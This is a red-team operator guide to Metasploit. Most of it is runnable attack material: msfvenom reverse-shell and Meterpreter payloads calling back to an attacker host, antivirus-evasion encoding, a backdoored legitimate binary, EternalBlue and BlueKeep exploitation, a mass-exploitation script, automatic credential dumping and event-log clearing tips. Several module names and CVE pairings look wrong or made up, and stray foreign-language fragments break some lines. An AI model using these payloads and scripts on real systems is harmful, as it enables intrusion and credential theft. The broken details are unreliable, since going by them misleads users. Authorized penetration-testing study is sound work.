---
title: "Metasploit 101"
tags: [redteam, metasploit, guide, msf, exploitation]
created: 2026-04-29
updated: 2026-04-29
type: guide
---

# Metasploit 101

> [!info] Related Guides
> This guide is part of the **Cyber Exercise** vault. See also:
> - [[Network Enumeration Guide]] — systematic recon and enumeration procedures
> - [[Red Team Engagement Guide]] — full engagement lifecycle and methodology
> - [[Sliver C2 - Red Team Operator Guide]] — advanced C2 infrastructure and implant management

---

> **Audience**: Red team operators with Linux/Windows admin fundamentals.  
> **Prerequisites**: Basic networking, familiarity with `msfconsole` environment, legal authorization.  
> **Scope**: Framework architecture → module authoring. This is your primary exploitation workhorse until you transition to [[Sliver C2 - Red Team Operator Guide]] for advanced C2 scenarios.

---

## Table of Contents

1. [Overview](#1-overview)
2. [Installation & Setup on Kali](#2-installation--setup-on-kali)
3. [msfconsole Basics](#3-msfconsole-basics)
4. [Payload Generation with msfvenom](#4-payload-generation-with-msfvenom)
5. [Exploit Modules](#5-exploit-modules)
6. [Post-Exploitation Modules](#6-post-exploitation-modules)
7. [Database Integration](#7-database-integration)
8. [Resource Scripts](#8-resource-scripts)
9. [Integration with Sliver](#9-integration-with-sliver)
10. [OPSEC Considerations](#10-opsec-considerations)
11. [Quick Reference Cheat Sheet](#11-quick-reference-cheat-sheet)

---

## 1. Overview

### What Is Metasploit?

Metasploit is the world's most widely used penetration testing and exploitation framework, developed by Rapid7. It provides:

- **5,000+ exploit modules** (remote code execution against known CVEs)
- **3,000+ payload options** (shellcode, staged loaders, native implants)
- **Integrated database** (PostgreSQL) for loot, hosts, credentials, and notes
- **Meterpreter** — a sophisticated in-memory payload with file transfer, command execution, and post modules
- **msfvenom** — standalone payload generation (no database required)

### When to Use Metasploit vs Sliver C2

| Scenario | Use Metasploit | Use [[Sliver C2 - Red Team Operator Guide]] |
|---|---|---|
| CVE exploitation (EternalBlue, SMB, etc.) | ✅ Native module exists | ⚠️ Sliver can run MSF modules |
| Quick client-side test | ✅ `msfconsole` rapid iteration | ❌ Overkill |
| Long-duration C2 operations | ⚠️ Limited evasion | ✅ Daily check-ins, custom implants |
| Pivoting through one hop | ✅ `route` cmd, `tunnel` mod | ✅ Better pivoting ergonomics |
| OPSEC-critical engagement | ⚠️ Well-known signatures | ✅ Custom, signature-thin implants |
| Automated exploitation pipeline | ✅ `resource` scripts | ⚠️ Not designed for scripting |

> **Tip**: Use Metasploit for the "exploit" phase of an engagement. If the engagement calls for a long-lived C2 with custom implants and aggressive evasion, switch to [[Sliver C2 - Red Team Operator Guide]] after initial foothold.

### Core Concepts

| Concept | Description |
|---|---|
| **Module** | A reusable software component (exploit, payload, encoder, post, auxiliary) |
| **Exploit** | Module that triggers a vulnerability |
| **Payload** | Code run after successful exploitation |
| **Staged payload** | Downloads the rest of the payload over the network (`reverse_tcp`) |
| **Inline payload** | Single self-contained blob (`bind_tcp`) |
| **Encoder** | Obfuscates shellcode to evade AV/signature detection |
| **NOP sled** | No-operation instructions to pad shellcode |
| **Handler** | Listener that catches reverse connections |

---

## 2. Installation & Setup on Kali

### Already Available on Kali

```bash
# Verify Metasploit is present
msfconsole --version
msfvenom --version

# Start the database (required for hosts/services/loot tracking)
msfdb init

# Start msfconsole WITH database
msfconsole
```

### First-Run Checklist

```
[msfconsole]
1. Run `msfdb init`                          # Creates PostgreSQL DB
2. Run `msfconsole`                         # Connects automatically
3. Type `db_status`                         # Confirm DB is connected
4. Type `workspace -h`                      # Review workspace commands
5. Type `help`                              # Full command reference
```

### Docker Install (Non-Kali)

```bash
# Option A: Docker container (Rapid7 official)
docker pull rapid7/metasploit-framework:latest
docker run -it rapid7/metasploit-framework:latest

# Option B: Native install on Ubuntu/Debian
apt-get update && apt-get install metasploit-framework postgresql
msfdb init
msfconsole
```

---

## 3. msfconsole Basics

### Core Navigation

```bash
# Enter msfconsole
msfconsole

# Within msfconsole — essential commands
help                    # List all available commands
help <command>          # Get help for a specific command
exit                    # Exit msfconsole

# Module search and load
search <keyword>        # Search modules by name/CVE/description
search name:smb type:exploit platform:windows
use <module/path>       # Load a module
info                    # Display current module info
show options           # Show module required/optional parameters
show payloads          # Show compatible payloads for current exploit
show targets           # Show vulnerable target systems
show advanced          # Show advanced module options

# Module interaction
set <option> <value>    # Set a module option
setg <option> <value>   # Set globally (all modules)
unset <option>          # Remove a set value
unsetg <option>         # Remove a global value
run                     # Execute current module (alias: exploit)
run -j                  # Run as background job
exploit                 # Same as run
exploit -j              # Same as run -j

# Meterpreter-specific (after successful exploit)
sessions -l            # List active sessions
sessions -i <id>       # Interact with session
sessions -k <id>       # Kill session
background             # Background current Meterpreter session
```

### Workspaces

```bash
workspace -l           # List all workspaces
workspace <name>       # Switch to workspace
workspace -a <name>    # Add new workspace
workspace -d <name>   # Delete workspace
workspace -D           # Delete ALL workspaces (careful!)
```

> **Tip**: Use a new workspace per engagement. Never mix client data.

### Database Integration (Essential Workflow)

```bash
# Import scan results from Nmap
db_import /path/to/scan.xml

# Manual host addition
db_host -a 192.168.1.100
db_host -a 192.168.1.101 -t host --name "DC01"

# Add services
db_services -a 192.168.1.100 -p 445 -s smb -t tcp

# Show all hosts in DB
hosts
services
notes
loot
```

### Example: Quick SMB Scan Workflow

```bash
msfconsole -q  # -q = quiet, no banner

# 1. Import Nmap scan
db_import ~/scans/target-network.xml

# 2. Search for SMB exploits
search name:smb type:exploit

# 3. Load EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
show options
run
```

> **Warning**: Never run `exploit/windows/smb/ms17_010_eternalblue` against production systems without testing. It can cause BSOD on unpatched Windows Server 2008 R2 and earlier.

---

## 4. Payload Generation with msfvenom

### Concepts First

| Payload Type | Description | Use Case |
|---|---|---|
| `reverse_tcp` | Target connects BACK to attacker | Behind NAT, firewalls |
| `reverse_https` | Target connects to attacker over HTTPS | Proxy-aware, firewall-friendly |
| `reverse_http` | Same as HTTPS but over HTTP | Less encrypted traffic |
| `bind_tcp` | Attacker connects TO target | Target is directly reachable |
| `bind_ipv6_tcp` | IPv6 version of bind_tcp | IPv6-only environments |

**Staged vs Inline:**

| Type | Format | Connection Behavior |
|---|---|---|
| **Staged** | `payload/staged/path` | Connection → small stub → downloads full payload |
| **Inline** | `payload/inline/path` | Self-contained, no download step |
| **Meterpreter** | `meterpreter/*` | Full-featured RAT, upload/download/keylog |

### Windows Payloads

```bash
# === REVERSE TCP (attacker listens with multi/handler) ===

# 32-bit staged — tiny DLL dropper
msfvenom -a x86 -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# 64-bit staged
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe -o shell_x64.exe

# 32-bit inline ( stageless — no stage download)
msfvenom -a x86 -p windows/shell/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe -o shell_inline.exe

# 64-bit inline stageless
msfvenom -a x64 -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64_inline.exe

# === REVERSE HTTPS (avoids plain TCP detection) ===
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.50 LPORT=443 LURI=/updates \
  -f exe -o shell_https.exe

# === BIND TCP (target listens, attacker connects) ===
msfvenom -a x64 -p windows/x64/meterpreter/bind_tcp \
  RHOST=192.168.1.101 LPORT=4444 -f exe -o shell_bind.exe

# === DLL PAYLOAD (for injecting into legitimate processes) ===
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f dll -o inject.dll

# === POWERSHELL (pure text — good for lateral movement) ===
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.50 LPORT=443 -f psh -o shell.ps1
```

### Linux Payloads

```bash
# 64-bit staged Meterpreter
msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# 64-bit inline shell
msfvenom -a x64 -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f elf -o shell_bin.elf

# ARM (for embedded / IoT targets)
msfvenom -a armle -p linux/armle/shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f elf -o shell_arm.elf
```

### macOS Payloads

```bash
# Mach-O binary (staged)
msfvenom -a x64 -p osx/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f macho -o shell.macho

# Bind shell (staged)
msfvenom -a x64 -p osx/x64/shell_bind_tcp \
  RHOST=192.168.1.101 LPORT=4444 -f macho -o shell_bind.macho
```

### Python Payloads

```bash
# Standalone Python Meterpreter stage
msfvenom -a cmd -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444
# Outputs: python code — paste into target python environment
```

### Shellcode (Raw) Output

```bash
# Raw shellcode (C format — inject into custom loader)
msfvenom -a x64 -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f c

# Raw shellcode (raw bytes)
msfvenom -a x64 -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f raw

# Python (for `eval()` execution contexts)
msfvenom -a cmd -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f python
```

### Encoding to Evade Basic AV

```bash
# Single encode — shikata_ga_nai (good first-pass AV evasion)
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.50 LPORT=443 -f exe -e x64/shikata_ga_nai \
  -i 5 -o shell_encoded.exe

# Double encode (for heavy AV environments)
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.50 LPORT=443 -f exe \
  -e x86/shikata_ga_nai -i 3 \
  -e x64/xor -i 1 \
  -o shell_double_encoded.exe

# Template/Stub injection (runs within legitimate binary)
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe \
  -e x64/shikata_ga_nai -i 3 \
  -x /usr/share/windows-binaries/sysktr.exe \
  -o backdoored_sysktr.exe
```

> **Warning**: `-x` (custom template) can introduce instability. Test on identical OS/build before using in an engagement. Also, signed binaries with injected code may fail signature validation.

---

## 5. Exploit Modules

### Decision Tree: Choosing an Exploit

```
START: Target identified
  │
  ├─► CVE known?
  │     ├─ YES → search exploit by CVE ID: `search cve:2021-44228`
  │     └─ NO  → proceed
  │
  ├─► Service/Port identified?
  │     ├─ YES → `search type:exploit port:445 platform:windows`
  │     └─ NO  → Nmap scan → fingerprinting → proceed
  │
  └─► Auth required?
        ├─ YES → credentialed attack (SMB, SSH, winrm)
        └─ NO  → unauthenticated exploit (EternalBlue, Java RMI)
```

### Essential Exploit Examples

#### 5.1 EternalBlue (MS17-010) — Windows SMB

```bash
# SCAN first (auxiliary — safe, never crashes targets)
use auxiliary/scanner/smb/smb_ms17_010_emeraldtray
set RHOSTS 192.168.1.0/24
run

# If targets are VULNERABLE, exploit:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set TARGET 12  # Windows 10 / Server 2016+
run
```

#### 5.2 BlueKeep (CVE-2019-0708) — RDP RCE

```bash
# Check if vulnerable (auxiliary)
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.0/24
run

# Exploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run
```

> **Warning**: BlueKeep can crash targets running Windows 7 SP0 or XP. Set `TARGET` option carefully.

#### 5.3 Apache Struts (CVE-2018-11776)

```bash
use exploit/linux/http/struts2_content_type
set RHOSTS 192.168.1.200
set TARGETURI /struts2-showcase/
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run
```

#### 5.4 SSH Brute Force (Valid Credentials → RCE)

```bash
# Step 1: Find SSH login
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.102
set USERNAME admin
set PASSWORD Summer2024!
run

# Step 2: After valid credentials found, use them
use exploit/multi/ssh/sshexec
set RHOSTS 192.168.1.102
set USERNAME admin
set PASSWORD Summer2024!
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run
```

#### 5.5 WinRM for Lateral Movement

```bash
# Check if WinRM is accessible
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 192.168.1.102
set USERNAME administrator
set PASSWORD P@ssw0rd!
run

# Use WinRM to execute payload
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 192.168.1.102
set USERNAME administrator
set PASSWORD P@ssw0rd!
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run
```

### Setting Module Options

```bash
# Show all options (required options marked with "yes")
show options

# Required only
show missing

# Common options
set RHOSTS 192.168.1.0/24      # Target IP/range
set RHOST 192.168.1.101        # Single target (some modules use RHOST)
set THREADS 10                  # Concurrent threads for scanners
set VERBOSE true               # See detailed output
set VERBOSE false              # Suppress for clean output

# Payload options (varies by payload)
set LHOST 192.168.1.50         # Attacker IP (reverse connect)
set LPORT 4444                 # Attacker port
set LURI /api/                 # HTTP URI path (for HTTPS stage)
set RHOST 192.168.1.101        # Target IP (for bind payloads)

# Encoder options
set DisablePayloadHandler true  # Don't start a handler in this module
set EXITFUNC thread              # Exit method: process, thread, seh
```

---

## 6. Post-Exploitation Modules

> **Prerequisite**: Active Meterpreter session.  
> **Access**: `sessions -i <id>` to interact, then `run post/*`

### Module Categories

| Category | Path | Purpose |
|---|---|---|
| **enum_** | `post/multi/gather/` | Enumerate users, configs, browser data |
| **privesc_** | `post/multi/recover/` | Privilege escalation detection |
| **gather_** | `post/linux/gather/` | Linux-specific loot collection |
| **credential_** | `post/windows/gather/` | Password/hash harvesting |
| **lateral_** | `post/windows化管理/` | Lateral movement via WMI, PsExec, etc. |

### Meterpreter Built-in Commands

```bash
# After getting a Meterpreter shell:
sysinfo                    # OS, architecture, hostname
getuid                     # Current user
getprivs                   # Available privileges
ps                         # Process list
kill <pid>                # Kill a process
migrate <pid>              # Migrate to another process
hashdump                   # Dump local SAM hashes (requires SYSTEM)
shell                      # Drop to interactive cmd.exe
powershell_import /path/to/module.ps1  # Load PowerShell script

# File operations
ls /path/
cd /path/
download /remote/file /local/path
upload /local/file /remote/path
pwd
cat /etc/passwd
rm /path/to/file
mkdir /tmp/cleanup

# Network operations
ifconfig / ipconfig         # Network interfaces
route                         # View/add routing table
portfwd add -l 4444 -p 3389 -r 192.168.1.101  # Local port forward
```

### Post Module Examples

#### 6.1 Privilege Escalation (Windows)

```bash
# Automatic privesc checker (Safe, enumeration-only)
run post/windows/gather/win_privs

# PowerUp — find misconfigurations that enable privesc
run post/multi/recon/powerup_v0.3.7

# Metasploit local exploit suggester
run post/multi/recon/local_exploit_suggester

# If you find a working exploit, e.g. KiTrap0D:
run post/windows/escalate/getsystem
```

#### 6.2 Credential Harvesting

```bash
# SAM hashes (needs SYSTEM privs)
run post/windows/gather/hashdump

# LSASS process (needs SYSTEM)
run post/windows/gathercredential_from_lsass

# Cached Domain Credentials
run post/windows/gather/cachedump

# VNC passwords
run post/windows/gather/credentials/vnc

# Browser credentials
run post/windows/gather/credentials/chrome
run post/windows/gather/credentials/mozilla
```

#### 6.3 Lateral Movement

```bash
# PsExec-style (requires ADMIN$ share open)
run post/windows/manage/psexec_exploit \
  SET_RHOSTS=192.168.1.105 \
  SET_USERNAME=administrator \
  SET_PASSWORD=P@ssw0rd!

# WMI (more OPSEC-friendly, uses port 135)
run post/windows/manage/payload_inject \
  HANDLER=true \
  PAYLOAD=windows/meterpreter/reverse_tcp

# Overpass-the-Hash (use NTLM hash to authenticate)
run post/windows/manage/hashinject
```

#### 6.4 Network Recon (Pivoting Setup)

```bash
# Add route for pivoting (all Meterpreter sessions go through this)
run post/multi/manage/autoroute SESSION=-1 SUBNET=192.168.2.0 NETMASK=24

# Use `route` command for more control:
route add 192.168.2.0 255.255.255.0 2   # session 2 as pivot
route print                              # show all routes

# Scan through pivot with auxiliary modules
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
set THREADS 50
run
```

---

## 7. Database Integration

### Importing Scan Data

```bash
# Nmap XML (most common)
msfconsole -q -x "db_import /path/to/scan.xml"

# Nessus XML
db_import /path/to/scan.nessus

# Qualys XML
db_import /path/to/scan.xml

# Direct CSV
db_import /path/to/hosts.csv csv

# List what's imported
hosts         # All known hosts
services      # All known services
vulns         # All identified vulnerabilities
notes         # Operator annotations
loot          # Harvested credentials/hashes/certificates
```

### Automatic Import from Nmap

```bash
# Inside msfconsole
db_nmap -sV 192.168.1.0/24 -p 445,3389,80,443,22
```

### Marking Findings

```bash
# Add a note about a host
note -t host:192.168.1.101 -n "EternalBlue vulnerable, patch by 2026-05-15"

# Add vulnerability to a host
vulns -a 192.168.1.101 -t CVE-2017-0144 -n "EternalBlue"
```

### Loot Management

```bash
loot                    # List all loot
loot -l                 # Detailed loot list
loot -d <id>           # Delete specific loot entry
```

---

## 8. Resource Scripts

Resource scripts automate Metasploit workflows. Files end in `.rc`.

### Example: Automated SMB Enum + Exploit

```bash
# File: /root/engage/eternalblue.rc
# Usage: msfconsole -r eternalblue.rc

<ruby>
# Auto-create and switch workspace
print_status("Setting up workspace")
framework.db.workspaces.create(name: "engage_2026")
workspace "engage_2026"

# Load and run scanner
run_single("use auxiliary/scanner/smb/smb_ms17_010_emeraldtray")
run_single("set RHOSTS 192.168.1.0/24")
run_single("set THREADS 20")
run_single("run")

# If scan complete, switch to exploit
run_single("use exploit/windows/smb/ms17_010_eternalblue")
run_single("set RHOSTS 192.168.1.101")
run_single("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
run_single("set LHOST 192.168.1.50")
run_single("set LPORT 4444")
run_single("run -j")
print_good("Handler started. Waiting for session...")
</ruby>
```

### Example: Mass Exploitation Script

```bash
# File: mass_eternalblue.rc
# Exploits all MS17-010 vulnerable hosts from DB

<ruby>
# Get all hosts flagged as vulnerable by scanner
vuln_hosts = framework.db.hosts.where(service: {name: "smb"}).all

vuln_hosts.each do |host|
  print_status("Exploiting #{host.address}")
  run_single("use exploit/windows/smb/ms17_010_eternalblue")
  run_single("set RHOSTS #{host.address}")
  run_single("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
  run_single("set LHOST 192.168.1.50")
  run_single("set LPORT 4444")
  run_single("run -j")
end
</ruby>
```

> **Tip**: Run resource scripts in quiet mode: `msfconsole -q -r script.rc`

### Example: Session Management Script

```bash
# File: session_handler.rc
# Auto-handles incoming sessions and runs post modules

<ruby>
# Event hook: when a new session opens
framework.sessions.on_new_session do |session|
  print_good("New session #{session.id} from #{session.session_host}")

  # Run hashdump automatically
  session.run_single("hashdump")

  # Migrate to stable process
  session.run_single("migrate -N services.exe")

  # Run enumeration
  session.run_single("run post/windows/gather/enum_shares")
  session.run_single("run post/windows/gather/enum_applications")
end
</ruby>
```

### Running Resource Scripts

```bash
msfconsole -r /path/to/script.rc        # Run from CLI
msfconsole -q -r /path/to/script.rc    # Quiet mode
```

> **Warning**: Never run auto-exploit scripts against networks without explicit authorization. Use the scanner-only version first to confirm targets.

---

## 9. Integration with Sliver

### When Each Tool Excels

| Phase | Tool | Why |
|---|---|---|
| **Enumeration** | Metasploit | Huge module library for service scanning |
| **Exploitation (known CVE)** | Metasploit | Native modules, well-tested |
| **Initial Foothold** | Either | Meterpreter or Sliver implant |
| **Post-Exploitation** | Sliver | OPSEC, persistence, pivot tunneling |
| **Long-Duration C2** | Sliver | Custom implants, daily jitter, mTLS |
| **Automation Pipeline** | Metasploit | `resource` scripts + database |

### Workflow: Metasploit → Sliver

```
1. Exploit with Metasploit → get Meterpreter shell
2. Assess if engagement needs long-term C2
   └─ YES → Migrate to Sliver:
      a. On target: download Sliver stage2 binary
      b. Execute → Sliver beacon connects to C2
      c. In Sliver: `sleep 0` for interactive mode
      d. Background Meterpreter (don't kill — preserve access if Sliver fails)
```

### Workflow: Sliver → Metasploit (Using MSF Modules)

```
1. Sliver gets initial shell
2. In Metasploit: use the target as pivot
   a. Add Sliver session as pivot: `route add <target_subnet> <mask> <session_id>`
   b. Use Metasploit auxiliary modules through the pivot
3. Example: port scan through Sliver pivot
   use auxiliary/scanner/portscan/tcp
   set RHOSTS 192.168.3.0/24
   set THREADS 20
   run
```

### Cross-Tool Pivoting

```bash
# In Sliver: add a route for Metasploit to use
> route add 192.168.2.0/24 <session_id>

# In Metasploit: all modules now route through Sliver session
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.2.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run
```

### Using Sliver-Generated Shellcode in Metasploit

Sliver can generate shellcode that Metasploit can catch with `multi/handler`:

```bash
# Sliver: generate staged payload
sliver > generate --format shellcode --os windows --arch amd64 \
  --payload reverse --lhost 192.168.1.50 --lport 443

# Metasploit: catch with generic handler
use multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 192.168.1.50
set LPORT 443
run -j
```

---

## 10. OPSEC Considerations

### Network Detection

| Behavior | Detection Risk | Mitigation |
|---|---|---|
| Unencrypted `reverse_tcp` on port 4444 | High — signature known | Use `reverse_https` on port 443 |
| Repeated same-source port probes | High — behavioral | Use `jdwp` or `java_mjet` for tunneling |
| Plain-text hashdump over network | High | Use `smbexec` or `wmi` for local-only hash dump |
| `shell_reverse_tcp` ASCII shellcode | Medium | Encode with `shikata_ga_nai` |
| Metasploit default SSL cert | High | Configure custom SSL cert for HTTPS payloads |

### Payload Evasion

```
Defense Evasion Layers:
1. Encoding  → msfvenom -e x64/shikata_ga_nai -i 5
2. Padding   → msfvenom --pad-count 10
3. Custom CA → reverse_https + Let's Encrypt cert
4. Tunneling → use existing services (HTTP/HTTPS) as C2 channel
5. Jitter    → Sleep with random interval (Sliver feature)
```

### Logging & Footprint

| Action | Evidence Left | Mitigation |
|---|---|---|
| `hashdump` | Cached credentials in memory | Execute once, extract quickly |
| File upload | File system artifact | Use in-memory-only techniques |
| Registry write | Persistence artifact | Document and plan removal |
| `reg` commands | Windows Security event log | Use `eventvwr` clear or minimize |
| SMB Lateral Move | 4648/4624 Security events | Limit scope, brief engagement |

> **Warning**: Metasploit is a well-known tool. Most mature SOCs have detection rules for Meterpreter process injection, `reverse_tcp` on port 4444, and `meterpreter` in User-Agent strings. For red team engagements, assume you'll be detected — plan around it with short dwell times and quick目标 transition.

### Session Hygiene

```bash
# Always migrate immediately after getting a shell
# Bad: stay in spawned notepad.exe (dies when process closes)
# Good: migrate to a stable, long-running process
migrate -N svchost.exe    # Windows
migrate -N systemd        # Linux

# Background shells you don't need yet
background               # Don't kill valuable access

# Use `clearev` sparingly (suspicious, high-value event)
# Better: document what to clear, clean at end of engagement
```

---

## 11. Quick Reference Cheat Sheet

### Module Navigation

| Command | Action |
|---|---|
| `search <query>` | Search modules |
| `use <module>` | Load module |
| `info` | Show module info |
| `show options` | Show required/optional params |
| `show payloads` | Show compatible payloads |
| `set <opt> <val>` | Set option |
| `setg <opt> <val>` | Set global option |
| `run` / `exploit` | Execute module |
| `run -j` / `exploit -j` | Run as background job |
| `back` | Back to previous context |

### Payload Generation (msfvenom)

| Command | Purpose |
|---|---|
| `msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf` | Linux ELF |
| `msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe` | Windows EXE |
| `msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe -o shell.exe` | Windows HTTPS |
| `msfvenom -a cmd -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f python` | Python |
| `msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o inject.dll` | Windows DLL |
| `msfvenom -a x64 -p linux/x64/meterpreter/bind_tcp RHOST=<IP> LPORT=4444 -f elf -o bind.elf` | Bind shell (attacker connects to target) |
| `msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o enc.exe` | Encoded EXE |

### Session Management

| Command | Action |
|---|---|
| `sessions -l` | List all sessions |
| `sessions -i <id>` | Interact with session |
| `sessions -k <id>` | Kill session |
| `sessions -K` | Kill all sessions |
| `background` | Background current session |
| `sleep 0` | (Sliver) Immediate check-in |

### Database

| Command | Action |
|---|---|
| `db_status` | Check DB connection |
| `hosts -l` | List all hosts |
| `services -l` | List all services |
| `notes -l` | List all notes |
| `loot -l` | List all loot |
| `db_import /path/to/scan.xml` | Import Nmap XML |
| `vulns` | List vulnerabilities |

### Post-Exploitation (Meterpreter)

| Command | Action |
|---|---|
| `sysinfo` | Target OS info |
| `getuid` | Current user |
| `hashdump` | Dump SAM hashes |
| `migrate -N <process>` | Migrate to process |
| `download <rpath> <lpath>` | Download file |
| `upload <lpath> <rpath>` | Upload file |
| `shell` | Interactive OS shell |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Port forward |

### Meterpreter → Post Module Pattern

```bash
sessions -i 2                    # Interact with session 2
run post/windows/gather/hashdump  # Runs as user context
run post/multi/recon/local_exploit_suggester
run post/windows/escalate/getsystem
```

### Sliver / Metasploit Handoff

| Step | Command |
|---|---|
| Sliver: add route | `route add 192.168.2.0/24 <session>` |
| Metasploit: scan through pivot | `use auxiliary/scanner/portscan/tcp` → `set RHOSTS 192.168.2.0/24` |
| Sliver: generate shellcode | `generate --format shellcode --os windows --arch amd64` |
| Metasploit: catch shellcode | `use multi/handler` → `set PAYLOAD generic/shell_reverse_tcp` |

---

> **Tip**: Bookmark the Rapid7 Metasploit module database at `https://www.rapid7.com/db/modules` for search with CVE filtering. For custom exploits, contribute via GitHub (`rapid7/metasploit-framework`).

---

**See also:**
- [[Red Team Engagement Guide]] — overall engagement structure
- [[Sliver C2 - Red Team Operator Guide]] — advanced C2 and implant development
